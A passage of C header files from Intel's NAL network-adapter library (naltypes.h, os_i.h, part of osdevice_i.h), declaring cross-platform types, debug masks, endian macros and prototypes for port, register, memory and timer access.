  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

*/

/*
 *
 * Module Name:
 *   naltypes.h
 *
 * Abstract:
 *   NAL types for each OS are declared here.
 *
 */


#ifndef _NALTYPES_H_
#define _NALTYPES_H_ 

#if defined(NAL_EFI)

#include <efi.h>

typedef VOID KVOID;
typedef UINT16 PORT_ADDR;
typedef UINT64 NAL_PHYSICAL_ADDRESS;
typedef char CHAR;
typedef CHAR16 WCHAR;
typedef UINT32 NAL_STATUS;

typedef volatile UINT32 NAL_SPIN_LOCK;

#define NAL_MAX_INTERRUPT_VECTORS 256
#define NAL_MAX_REFERENCES 32

typedef struct _NAL_VECTOR
{
    volatile BOOLEAN NalInterruptVector;
    UINT32 ReferenceCount;
} NAL_VECTOR;

typedef VOID (*NAL_SERVICE_ROUTINE) (VOID);

#if defined(NAL_DEBUG)
#define ASSERTEX(X,f,l) 
#else
#define ASSERTEX(X,f,l) 
#endif

#elif defined(NAL_DOS)

#define _EXACT_WIDTH_INTS 

typedef void VOID;
typedef void KVOID;
typedef signed char INT8;
typedef unsigned char UINT8;
typedef signed short INT16;
typedef unsigned short UINT16;
typedef signed long INT32;
typedef unsigned long UINT32;
typedef signed __int64 INT64;
typedef unsigned __int64 UINT64;
typedef signed int INTN;
typedef unsigned int UINTN;

typedef UINT8 BOOLEAN;
typedef UINT16 PORT_ADDR;
typedef UINT64 NAL_PHYSICAL_ADDRESS;
typedef char CHAR;
typedef UINT16 WCHAR;
typedef UINT32 NAL_STATUS;

typedef volatile UINT32 NAL_SPIN_LOCK;

#define INLINE __inline

#define NAL_MAX_INTERRUPT_VECTORS 256
#define NAL_MAX_REFERENCES 32

typedef struct _NAL_VECTOR
{
    volatile BOOLEAN NalInterruptVector;
    UINT32 ReferenceCount;
} NAL_VECTOR;

typedef VOID (*NAL_SERVICE_ROUTINE) (VOID);

#if defined(NAL_DEBUG)
#include <stdio.h>
#include <stdlib.h>
#define ASSERT(X) if (!(X)) {printf("ASSERT %s (%d): " #X "\n", __FILE__, __LINE__); getchar();}
#define ASSERTEX(X,f,l) if (!(X)) {printf("ASSERT %s (%d): " #X "\n", f, l); getchar();}
#else
#define ASSERT(X) 
#define ASSERTEX(X,f,l) 
#endif

#elif defined(NAL_LINUX)

#ifdef NAL_DRIVER

#include <linux/time.h>

#undef VOID
#endif

#ifndef VOID
#define VOID void
#endif
#define KVOID void
typedef signed char INT8;
typedef unsigned char UINT8;
typedef signed short INT16;
typedef unsigned short UINT16;
typedef signed int INT32;
typedef unsigned int UINT32;
typedef signed long long INT64;
typedef unsigned long long UINT64;
typedef signed long INTN;
typedef unsigned long UINTN;

typedef UINT8 BOOLEAN;
typedef UINT16 PORT_ADDR;
typedef UINT64 NAL_PHYSICAL_ADDRESS;
typedef char CHAR;
typedef UINT16 WCHAR;
typedef UINT32 NAL_STATUS;

#define INLINE static inline

#if defined(LINUXPPC64)
#define NAL_BIG_ENDIAN 1
#endif
#if defined(LINUXPPC)
#define NAL_BIG_ENDIAN 1
#endif

#if defined(NAL_DRIVER)
typedef UINTN NAL_SPIN_LOCK;
#else
#include <sys/types.h>

typedef pthread_mutex_t NAL_SPIN_LOCK;

#include <stdint.h>
#endif

#if defined(NAL_DRIVER)
  #if defined(LINUXPPC)
    #define NAL_BIG_ENDIAN 1
  #endif
  #if defined(LINUXPPC64)
    #define NAL_BIG_ENDIAN 1
  #endif
#endif

#if defined(NAL_DEBUG)
#define ASSERT(X) 
#define ASSERTEX(X,f,l) 
#else
#define ASSERT(X) 
#define ASSERTEX(X,f,l) 
#endif

#elif defined(NAL_SOLARIS)

#ifndef VOID
typedef void VOID;
#endif
typedef void KVOID;
typedef signed char INT8;
typedef unsigned char UINT8;
typedef signed short INT16;
typedef unsigned short UINT16;
typedef signed int INT32;
typedef unsigned int UINT32;
typedef signed long long INT64;
typedef unsigned long long UINT64;
typedef signed long INTN;
typedef unsigned long UINTN;

typedef UINT8 BOOLEAN;
typedef UINT16 PORT_ADDR;
typedef UINT64 NAL_PHYSICAL_ADDRESS;
typedef char CHAR;
typedef UINT16 WCHAR;
typedef UINT32 NAL_STATUS;

#define INLINE static inline

#ifndef NAL_BIG_ENDIAN
#if defined(SPARC32)
#define NAL_BIG_ENDIAN 1
#endif
#if defined(SPARC64)
#define NAL_BIG_ENDIAN 1
#endif
#endif

#include <pthread.h>
typedef pthread_mutex_t NAL_SPIN_LOCK;

#if defined(NAL_DEBUG)
#ifndef ASSERT
#define ASSERT(X) 
#endif
#ifndef ASSERTEX
#define ASSERTEX(X,f,l) 
#endif
#else
#ifndef ASSERT
#define ASSERT(X) 
#endif
#ifndef ASSERTEX
#define ASSERTEX(X,f,l) 
#endif
#endif

#elif defined(NAL_WINNT_WDM) || defined(NAL_WINNT4)

#if defined(_WIN64)
    typedef __int64 INTN;
    typedef unsigned __int64 UINTN;
#else
    typedef long INTN;
    typedef unsigned long UINTN;
#endif

#if defined(NAL_DRIVER)
#include <ntddk.h>

#if defined(NAL_WINNT4)
    typedef unsigned char UINT8;
    typedef signed char INT8;
    typedef char CHAR;
    typedef signed short INT16;
    typedef unsigned short UINT16;
    typedef ULONG UINT32;
    typedef signed int INT32;
    typedef ULONGLONG UINT64;
    typedef LONGLONG INT64;
#endif
#else
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN 
#endif

#include <windows.h>
#include <winioctl.h>
#endif

typedef signed char INT8;
typedef unsigned char UINT8;
typedef signed short INT16;
typedef unsigned short UINT16;

typedef void KVOID;
typedef UINTN PORT_ADDR;
typedef UINT64 NAL_PHYSICAL_ADDRESS;
typedef UINT32 NAL_STATUS;

typedef struct _NAL_SPIN_LOCK
{
    volatile UINT32 SpinLock;
    BOOLEAN Initialized;
    BOOLEAN Acquired;
} NAL_SPIN_LOCK;

#if defined(NAL_DEBUG)
#ifndef ASSERT
#define ASSERT(X) 
#endif
#ifndef ASSERTEX
#define ASSERTEX(X,f,l) 
#endif
#else
#ifndef ASSERT
#define ASSERT(X) 
#endif
#ifndef ASSERTEX
#define ASSERTEX(X,f,l) 
#endif
#endif

#else

#error "Undefined NAL Operating System in naltypes.h."
#endif

#ifndef IN
#define IN 
#endif

#ifndef OUT
#define OUT 
#endif

#ifndef NULL
#define NULL (VOID *)0
#endif

#ifndef TRUE
#define TRUE 1
#endif

#ifndef FALSE
#define FALSE 0
#endif

#ifndef OPTIONAL
#define OPTIONAL 
#endif

#ifndef INLINE
#define INLINE __forceinline
#endif

#define PHYSICAL_NULL (NAL_PHYSICAL_ADDRESS)0

typedef enum _NAL_DEBUG_PRINT_CAPABILITIES
{
    NAL_DEBUG_PRINT_SUPPORTED = 0x00000001,
    NAL_DEBUG_PRINT_ASCII = 0x00000002,
    NAL_DEBUG_PRINT_RESERVED = 0x00000004,
    NAL_DEBUG_PRINT_FILEIO = 0x00000008,
    NAL_DEBUG_PRINT_COUNT
} NAL_DEBUG_PRINT_CAPABILITIES;

#define NAL_SIZE_OF_8_BYTES 8

#define NAL_PIC1_FIRST_ACCESS_PORT 0x0020
#define NAL_PIC2_FIRST_ACCESS_PORT 0x00A0
#define NAL_PIC1_SECOND_ACCESS_PORT 0x0021
#define NAL_PIC2_SECOND_ACCESS_PORT 0x00A1
#define NAL_CLEAR_PIC_COMMAND 0x0020

#define NAL_TIMER_INTERVAL_LENGTH 100
#define NAL_MAX_TIMER_CALLBACKS 1

typedef VOID (*NAL_TIMER_CALLBACK) (VOID*);
typedef VOID *(*NAL_THREAD_FUNC) (VOID*);

#ifndef NAL_DRIVER

typedef struct _NAL_TIMER_CALLBACK_ENTRY
{
    struct _NAL_TIMER_CALLBACK_ENTRY* Next;
    struct _NAL_TIMER_CALLBACK_ENTRY* Prev;

    volatile UINT64 NextExecution;

    NAL_TIMER_CALLBACK TimerCallback;
    VOID* Context;

    UINT32 CallbackId;

    UINT32 TimerInterval;

    UINT32 Status;

} NAL_TIMER_CALLBACK_ENTRY;

#define NAL_TIMER_CALLBACK_ID_INVALID 0
#define NAL_TIMER_CALLBACK_ID_NEW_ENTRY -1

#define NAL_TIMER_CALLBACK_STATUS_NONE 0
#define NAL_TIMER_CALLBACK_STATUS_WAITING 1
#define NAL_TIMER_CALLBACK_STATUS_RESCHEDULE 2
#define NAL_TIMER_CALLBACK_STATUS_EXECUTING 3
#define NAL_TIMER_CALLBACK_STATUS_REMOVE 4

#endif

typedef enum _NAL_ASF_SUPPORT
{
    NAL_ASF_NOT_SUPPORTED = 0,
    NAL_ASF1_SUPPORTED,
    NAL_ASF2_SUPPORTED,
    NAL_ASF1_ASF2_SUPPORTED
} NAL_ASF_SUPPORT;

typedef enum _NAL_OS_TYPE
{
    NAL_OS_UNKNOWN = 0,
    NAL_OS_DOS,
    NAL_OS_EFI32,
    NAL_OS_EFI64,
    NAL_OS_LINUX32,
    NAL_OS_WIN3XX,
    NAL_OS_WIN9X,
    NAL_OS_OS2,
    NAL_OS_WINNT4,
    NAL_OS_WIN2K,
    NAL_OS_WINXP32,
    NAL_OS_WINXP64,
    NAL_OS_WINXP64E,
    NAL_OS_LINUX64,
    NAL_OS_FREEBSD32,
    NAL_OS_FREEBSD64,
    NAL_OS_LINUX64E,
    NAL_OS_NWS,
    NAL_OS_EFI64E,
    NAL_OS_LINUXPPC,
    NAL_OS_LINUXPPC64,
    NAL_OS_COUNT,
    NAL_OS_SOLARIS_X86,
    NAL_OS_SOLARIS_64E,
    NAL_OS_SOLARIS_SPARC32,
    NAL_OS_SOLARIS_SPARC64
} NAL_OS_TYPE;

typedef enum _NAL_OS_RUN_DOMAIN
{
    NAL_OS_DOMAIN_BAREMETAL = 0,
    NAL_OS_DOMAIN_0,
    NAL_OS_DOMAIN_U
} NAL_OS_RUN_DOMAIN;

#define NAL_OS_LINUX NAL_OS_LINUX32

#if !defined(NAL_DRIVER)
#define boolean_t BOOLEAN
#define uint8_t UINT8
#define u8 UINT8
#define int8_t INT8
#define s8 INT8
#define uint16_t UINT16
#define u16 UINT16
#define int16_t INT16
#define s16 INT16
#define uint32_t UINT32
#define u32 UINT32
#define int32_t INT32
#define s32 INT32
#define uint64_t UINT64
#define u64 UINT64
#define int64_t INT64
#define s64 INT64
#endif

typedef UINT32 NAL_REGISTER;
typedef UINTN NAL_MAC_TYPE;

#define MAKE_BOOLEAN(x) (!!(x))

typedef enum _NAL_QUEUE_TYPE
{
    NAL_RX_QUEUE = 0,
    NAL_TX_QUEUE
} NAL_QUEUE_TYPE;

#endif

```

`source/IntelNal/inc/os_i.h`:

```h
/*

  This file is provided under a dual BSD/GPLv2 license.  When using or
  redistributing this file, you may do so under either license.

  GPL LICENSE SUMMARY

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.

  This program is free software; you can redistribute it and/or modify
  it under the terms of version 2 of the GNU General Public License as
  published by the Free Software Foundation.

  This program is distributed in the hope that it will be useful, but
  WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program; if not, write to the Free Software
  Foundation, Inc., 51 Franklin St - Fifth Floor, Boston, MA 02110-1301 USA.
  The full GNU General Public License is included in this distribution
  in the file called LICENSE.GPL.

  Contact Information:
  e1000-devel Mailing List <e1000-devel@lists.sourceforge.net>
  Intel Corporation, 5200 N.E. Elam Young Parkway, Hillsboro, OR 97124-6497

  BSD LICENSE

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.
  All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions
  are met:

    * Redistributions of source code must retain the above copyright
      notice, this list of conditions and the following disclaimer.
    * Redistributions in binary form must reproduce the above copyright
      notice, this list of conditions and the following disclaimer in
      the documentation and/or other materials provided with the
      distribution.
    * Neither the name of Intel Corporation nor the names of its
      contributors may be used to endorse or promote products derived
      from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
  "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
  A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
  OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
  SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
  LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

*/

/*
 *
 * Module Name:
 *   os_i.h
 *
 * Abstract:
 *   This file contains prototypes & datatypes for the OS Interface.
 *   The OS-specific header is included for each OS.
 *
 */


#ifndef _OSINTERFACE_H_
#define _OSINTERFACE_H_

#include <naltypes.h>
#include <nalcodes.h>

#define NAL_CVS_DATE_STRING "$Date: 2013/07/29 11:16:24 $"
#define NAL_DEBUG_DISABLED 0x00000000
#define NAL_DEBUG_APP 0x00000001
#define NAL_DEBUG_MACREG_READ 0x00000002
#define NAL_DEBUG_MACREG_WRITE 0x00000004
#define NAL_DEBUG_MACREG_RW (NAL_DEBUG_MACREG_READ | NAL_DEBUG_MACREG_WRITE)
#define NAL_DEBUG_TRANSMIT 0x00000008
#define NAL_DEBUG_RECEIVE 0x00000010
#define NAL_DEBUG_TXRX (NAL_DEBUG_TRANSMIT | NAL_DEBUG_RECEIVE)
#define NAL_DEBUG_TXRX_LOOP_CODE 0x00000020
#define NAL_DEBUG_SHARED_CODE 0x00000040
#define NAL_DEBUG_PHYREG_READ 0x00000080
#define NAL_DEBUG_PHYREG_WRITE 0x00000100
#define NAL_DEBUG_PHYREG_RW (NAL_DEBUG_PHYREG_READ | NAL_DEBUG_PHYREG_WRITE)
#define NAL_DEBUG_INIT 0x00000200
#define NAL_DEBUG_RELEASE 0x00000400
#define NAL_DEBUG_RESET_ADAPTER 0x00000800
#define NAL_DEBUG_RESET_LINK 0x00001000
#define NAL_DEBUG_GET_LINK 0x00002000
#define NAL_DEBUG_OS_LEVEL 0x00004000
#define NAL_DEBUG_APP_TRACE 0x00008000
#define NAL_DEBUG_SDK_TRACE 0x00010000
#define NAL_DEBUG_KERNEL 0x00020000
#define NAL_DEBUG_EEPROM 0x00040000
#define NAL_DEBUG_FLASH 0x00080000
#define NAL_DEBUG_DIAGS 0x00100000
#define NAL_DEBUG_MEMORY 0x00200000
#define NAL_DEBUG_BUS_SCAN 0x00400000
#define NAL_DEBUG_FAILURES 0x00800000
#define NAL_DEBUG_TIMESYNC 0x01000000
#define NAL_DEBUG_PROTOCOL_ENGINE 0x02000000
#define NAL_DEBUG_HMC 0x04000000
#define NAL_DEBUG_USER 0x80000000
#define NAL_DEBUG_ALL 0xFFFFFFFF

#define NAL_DEBUG_MASK_STACK_SIZE 256
#define NAL_DEBUG_SYSTEM_VARIABLE "QV_DEBUG_LOG"
#define NAL_DEFAULT_SDK_LOG_FILE_NAME "QVSDK.LOG"
extern char Global_Year[5];

#if defined(NAL_EFI)
#include <efi\efios_i.h>

#elif defined(NAL_LINUX)
#include <linux/linuxos_i.h>

#elif defined(NAL_LINUX_USERMODE)
#include <linux/linuxuseros_i.h>

#elif defined(NAL_SOLARIS)
#include <solaris/solarisos_i.h>

#elif defined(NAL_DOS)
#include <dos\dosos_i.h>

#elif defined(NAL_WINNT_WDM)
#include <winnt_wdm\winos_i.h>

#elif defined(NAL_WINNT4)
#include <winnt4\winos_i.h>

#else

#error "Undefined NAL Operating System in os_i.h"
#endif

#define NAL_MIN(_x,_y) ((_x > _y)? (_y) : (_x))
#define NAL_MAX(_x,_y) ((_x > _y)? (_x) : (_y))

#define NAL_ABS(_x) (((_x) > 0)? (_x) : ((_x) * -1))

#if defined (NAL_DRIVER)
extern BOOLEAN Global_DebugPrintEnabled;
#endif

extern UINT32 Global_DebugPrintMask;
extern BOOLEAN Global_FileDebugPrintEnabled;

#if !defined(NAL_DRIVER)
extern FILE* Global_DebugFilePointer;
#endif

#if defined(EFI64) || defined(_WIN64) || defined(LINUX64) || defined(LINUX64E)
#define PTR_TO_PHYSICAL(Pointer) (NAL_PHYSICAL_ADDRESS)(Pointer)
#define PHYSICAL_TO_PTR(Address) (VOID*)(Address)
#else
#define PTR_TO_PHYSICAL(Pointer) (NAL_PHYSICAL_ADDRESS)(UINT32)(Pointer)
#define PHYSICAL_TO_PTR(Address) (VOID*)(UINT32)(Address)

#endif

#if defined(EFI64) || defined(_WIN64) || defined(LINUX64) || defined(LINUX64E)
#define NAL_FIELD_OFFSET32(type,field) ((UINT32)(UINT64)(UINT32*)&(((type *)0)->field))
#else
#define NAL_FIELD_OFFSET32(type,field) ((UINT32)(UINT32*)&(((type *)0)->field))
#endif

#if defined(NAL_BIG_ENDIAN)
#define NAL_LITTLE_ENDIAN_16(_x) (UINT16)( (((UINT16)(_x) & 0x00ff) << 8) | \
                                            (((UINT16)(_x) & 0xff00) >> 8) )
#define NAL_LITTLE_ENDIAN_32(dword) (UINT32)( (((UINT32)(dword) & 0x000000ff) << 24) | \
                                            (((UINT32)(dword) & 0x0000ff00) << 8) | \
                                            (((UINT32)(dword) & 0x00ff0000) >> 8) | \
                                            (((UINT32)(dword) & 0xff000000) >> 24) )
#define NAL_LITTLE_ENDIAN_64(_x) \
    (((UINT64)((_x) & 0xff00000000000000ull) >> 56) | \
    ((UINT64)((_x ) & 0xff000000000000ull) >> 40) | \
    ((UINT64)((_x ) & 0xff0000000000ull) >> 24) | \
    ((UINT64)((_x ) & 0xff00000000ull) >> 8) | \
    ((UINT64)((_x ) & 0xff000000ull) << 8) | \
    ((UINT64)((_x ) & 0xff0000ull) << 24) | \
    ((UINT64)((_x ) & 0xff00ull) << 40) | \
    ((UINT64)((_x ) & 0xffull) << 56))

#else
#define NAL_LITTLE_ENDIAN_16(_x) (_x)
#define NAL_LITTLE_ENDIAN_32(_x) (_x)
#define NAL_LITTLE_ENDIAN_64(_x) (_x)
#endif

UINT8
NalReadPort8(
    IN PORT_ADDR Port
    );

UINT16
NalReadPort16(
    IN PORT_ADDR Port
    );

UINT32
NalReadPort32(
    IN PORT_ADDR Port
    );

BOOLEAN
NalWritePort8(
    IN PORT_ADDR Port,
    IN UINT8 Value
    );

BOOLEAN
NalWritePort16(
    IN PORT_ADDR Port,
    IN UINT16 Value
    );

BOOLEAN
NalWritePort32(
    IN PORT_ADDR Port,
    IN UINT32 Value
    );

UINT8
NalReadRegister8(
    IN KVOID* Address
    );

UINT16
NalReadRegister16(
    IN KVOID* Address
    );

UINT32
NalReadRegister32(
    IN KVOID* Address
    );

BOOLEAN
NalWriteRegister8(
    IN KVOID* Address,
    IN UINT8 Value
    );

BOOLEAN
NalWriteRegister16(
    IN KVOID* Address,
    IN UINT16 Value
    );

BOOLEAN
NalWriteRegister32(
    IN KVOID* Address,
    IN UINT32 Value
    );

NAL_STATUS
NalMmapAddress(
    OUT KVOID** VirtualAddress,
    IN NAL_PHYSICAL_ADDRESS PhysicalAddress,
    IN OUT UINT32* Length
    );

NAL_STATUS
NalUnmapAddress(
    IN KVOID* VirtualAddress,
    IN NAL_PHYSICAL_ADDRESS PhysicalAddress,
    IN UINT32 Length
    );

UINT64
NalGetTimeStamp(VOID);

UINT64
NalGetTimeStampsPerMicrosecond(VOID);

UINT64
NalGetTimeStampsPerMillisecond(VOID);

NAL_STATUS
NalRegisterTimerCallback(
    IN NAL_TIMER_CALLBACK TimerCallback,
    IN OUT UINT32* TimerInterval,
    IN VOID* Context,
    OUT UINT32* CallbackId
    );

NAL_STATUS
NalUnregisterTimerCallback(
    IN UINT32 CallbackId
    );

VOID
NalDelayMilliseconds(
    IN UINT32 Milliseconds
    );

VOID
NalDelayMicroseconds(
    IN UINT32 Microseconds
    );

NAL_PHYSICAL_ADDRESS
NalGetPhysicalMemoryAddress(
    IN KVOID* VirtualAddress
    );

VOID*
_NalAllocateMemory(
    IN UINT32 ByteCount,
    IN CHAR* NamedLocator,
    IN UINT32 LineNumber
    );

VOID
_NalFreeMemory(
    IN VOID* Address,
    IN CHAR* NamedLocator,
    IN UINT32 LineNumber
    );

KVOID*
_NalAllocateMemoryNonPaged(
    IN UINT32 ByteCount,
    IN UINT32 Alignment,
    OUT NAL_PHYSICAL_ADDRESS* PhysicalAddress,
    IN CHAR* NamedLocator,
    IN UINT32 LineNumber
    );

VOID
_NalFreeMemoryNonPaged(
    IN KVOID* Address,
    IN CHAR* NamedLocator,
    IN UINT32 LineNumber
    );

#define NalAllocateMemory(ByteCount) \
    _NalAllocateMemory((ByteCount), __FILE__, __LINE__)

#define NalFreeMemory(VirtualAddress) \
    _NalFreeMemory((VirtualAddress), __FILE__, __LINE__)

#define NalAllocateMemoryNonPaged(ByteCount,Alignment,PhysicalAddress) \
    _NalAllocateMemoryNonPaged((ByteCount), (Alignment), (PhysicalAddress), \
                               __FILE__, __LINE__)

#define NalFreeMemoryNonPaged(VirtualAddress) \
    _NalFreeMemoryNonPaged((VirtualAddress), __FILE__, __LINE__)

UINT32
NalAtomicIncrement32(
    IN UINT32* Address
    );

UINT32
NalAtomicDecrement32(
    IN UINT32* Address
    );

UINT32
NalAtomicTestSet32(
    IN UINT32* Address,
    IN UINT32 Test,
    IN UINT32 Set
    );

VOID
NalAcquireSpinLock(
    IN NAL_SPIN_LOCK* SpinLock
    );

VOID
NalReleaseSpinLock(
    IN NAL_SPIN_LOCK* SpinLock
    );

VOID
NalInitializeSpinLock(
    IN NAL_SPIN_LOCK* SpinLock
    );

VOID
NalFreeSpinLock(
    IN NAL_SPIN_LOCK* SpinLock
    );

NAL_STATUS
NalCheckSecurity(VOID);

NAL_STATUS
NalDebugPrint(
    IN CHAR* Format,
    ...
    );

NAL_STATUS
_NalDebugPrintToDebugger(
    IN CHAR* StringToPrint
    );

NAL_STATUS
NalDebugPrintSupport(
    OUT UINT32* DebugCapabilities
    );

NAL_STATUS
NalDebugPrintOpenFile(
    IN CHAR* DebugFileName
    );

NAL_STATUS
NalDebugPrintCloseFile(VOID);

#if defined(NAL_DRIVER)
VOID
NalEnableDebugPrint(
    IN BOOLEAN Enable
    );
#else
VOID
NalEnableDebugPrint(
    IN UINT32 Mask
    );
#endif

BOOLEAN
_NalCheckSystemVariableForDebugMask(
    OUT UINT32* Mask
    );

NAL_STATUS
_NalSdkDebugPrintOpenFile(VOID);

VOID
_NalEnableSdkDebugPrint(
    IN UINT32 Mask
    );

NAL_STATUS
_NalSdkDebugPrintCloseFile(VOID);

VOID
_NalClearScreen(VOID);

VOID
NalRebootSystem(VOID);

BOOLEAN
NalIsTargetOperatingSystem(
    OUT NAL_OS_TYPE* OsType
    );

NAL_STATUS
NalMaskedDebugPrint(
    IN UINT32 Mask,
    IN CHAR* Format,
    ...
    );

NAL_STATUS
NalDebugPrintPushMask(
    IN UINT32 Mask
    );

NAL_STATUS
NalDebugPrintCheckAndPushMask(
    IN UINT32 MaskToCheck,
    IN UINT32 MaskToPush,
    OUT UINT32* IndexToCheck,
    IN BOOLEAN AddToExisting
    );

UINT32
NalDebugPrintPopMask(VOID);

UINT32
NalDebugPrintCheckAndPopMask(
    IN UINT32 MaskToCheck,
    IN UINT32 IndexToCheck
    );

UINT32
NalGetCurrentDebugPrintMask(VOID);

VOID
_NalEnableDebugPrint(
    IN BOOLEAN Enable
    );

BOOLEAN
NalIsDebugFileOpen(VOID);

UINT32
NalGetMaximumContiguousAllocationSize(VOID);

BOOLEAN
NalCanMapMemoryToUserSpace(VOID);

#if defined(NAL_DRIVER)

NAL_STATUS
NalMmapAddressEx(
    IN OUT KVOID** VirtualAddress,
    IN NAL_PHYSICAL_ADDRESS PhysicalAddress,
    IN OUT UINT32* Length,
    IN UINTN ProcessId
    );

NAL_STATUS
NalUnmapAddressEx(
    IN KVOID* VirtualAddress,
    IN NAL_PHYSICAL_ADDRESS PhysicalAddress,
    IN UINT32 Length,
    IN UINTN ProcessId
    );

KVOID*
_NalAllocateMemoryNonPagedEx(
    IN UINT32 ByteCount,
    IN UINT32 Alignment,
    IN UINTN ProcessId,
    OUT NAL_PHYSICAL_ADDRESS* PhysicalAddress,
    IN CHAR* NamedLocator,
    IN UINT32 LineNumber
    );

VOID
_NalFreeMemoryNonPagedEx(
    IN KVOID* Address,
    IN UINTN ProcessId,
    IN CHAR* NamedLocator,
    IN UINT32 LineNumber
    );

NAL_PHYSICAL_ADDRESS
NalGetPhysicalMemoryAddressEx(
    IN KVOID* VirtualAddress,
    IN UINTN ProcessId
    );

#endif

VOID
NalDisableMapMemoryToUserSpace(VOID);

BOOLEAN
NalOsSupportsIoMode(VOID);

UINT32
_NalBitSwap(
    IN UINT32 Data,
    IN UINT32 Bits
    );

char*
NalGetCopyrightYear(VOID);

#if !defined(NAL_DRIVER)
UINT32
NalGetLogicalCpuCount(VOID);

NAL_STATUS
NalCreateThread(
    IN NAL_THREAD_FUNC ThreadFunction,
    IN VOID* Context,
    OUT NAL_THREAD_ID* ThreadId
    );

NAL_STATUS
NalTerminateThread(
    IN NAL_THREAD_ID* ThreadId
    );

BOOLEAN
NalIsThreadRunning(
    IN NAL_THREAD_ID* ThreadId
    );
#endif

#endif

```

`source/IntelNal/inc/osdevice_i.h`:

```h
/*

  This file is provided under a dual BSD/GPLv2 license.  When using or
  redistributing this file, you may do so under either license.

  GPL LICENSE SUMMARY

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.

  This program is free software; you can redistribute it and/or modify
  it under the terms of version 2 of the GNU General Public License as
  published by the Free Software Foundation.

  This program is distributed in the hope that it will be useful, but
  WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program; if not, write to the Free Software
  Foundation, Inc., 51 Franklin St - Fifth Floor, Boston, MA 02110-1301 USA.
  The full GNU General Public License is included in this distribution
  in the file called LICENSE.GPL.

  Contact Information:
  e1000-devel Mailing List <e1000-devel@lists.sourceforge.net>
  Intel Corporation, 5200 N.E. Elam Young Parkway, Hillsboro, OR 97124-6497

  BSD LICENSE

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.
  All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions
  are met:

    * Redistributions of source code must retain the above copyright
      notice, this list of conditions and the following disclaimer.
    * Redistributions in binary form must reproduce the above copyright
      notice, this list of conditions and the following disclaimer in
      the documentation and/or other materials provided with the
      distribution.
    * Neither the name of Intel Corporation nor the names of its
      contributors may be used to endorse or promote products derived
      from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
  "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
  A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
  OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
  SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
  LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

*/

/*
 *
 * Module Name:
 *   osdevice_i.h
 *
 * Abstract:
 *   This file contains includes the OS specific osdevice file for the
 *   particular operating system being defined.
 *
 */


#ifndef _OSDEVICE_I_H_
#define _OSDEVICE_I_H_

#ifndef NAL_DRIVER
#include <device_t.h>

NAL_STATUS
_NalInitializeAdapterOs(
    IN NAL_DEVICE_LOCATION DeviceLocation,
    IN VOID* DeviceInfo,
    IN NAL_ADAPTER_STRUCTURE* NalAdapter,
    IN UINT32 InitFlags
    );

NAL_STATUS
_NalPostInitializeAdapterOs(
    IN NAL_ADAPTER_STRUCTURE* NalAdapter
    );

NAL_STATUS
_NalReleaseAdapterOs(
    IN NAL_ADAPTER_STRUCTURE* NalAdapter
    );

NAL_STATUS
_NalInitializeInterruptsOs(
    IN NAL_ADAPTER_STRUCTURE* NalAdapter
    );

NAL_STATUS
_NalUninitializeInterruptsOs(
    IN NAL_ADAPTER_STRUCTURE* NalAdapter
    );

BOOLEAN
_NalHasInterruptOccurredOs(
    IN NAL_ADAPTER_STRUCTURE* NalAdapter
    );

NAL_STATUS
_NalClearInterruptsOs(
    IN NAL_ADAPTER_STRUCTURE* NalAdapter
    );

BOOLEAN
_NalIsDeviceDriverLoadedOs(
    IN NAL_ADAPTER_STRUCTURE* NalAdapter
    );

NAL_STATUS
_NalUnloadDeviceDriverOs(
    IN NAL_ADAPTER_STRUCTURE* NalAdapter
    );

BOOLEAN
_NalReloadDeviceDriverOs(
    IN NAL_ADAPTER_STRUCTURE* NalAdapter
    );

UINT8
_NalReadPortOs8(
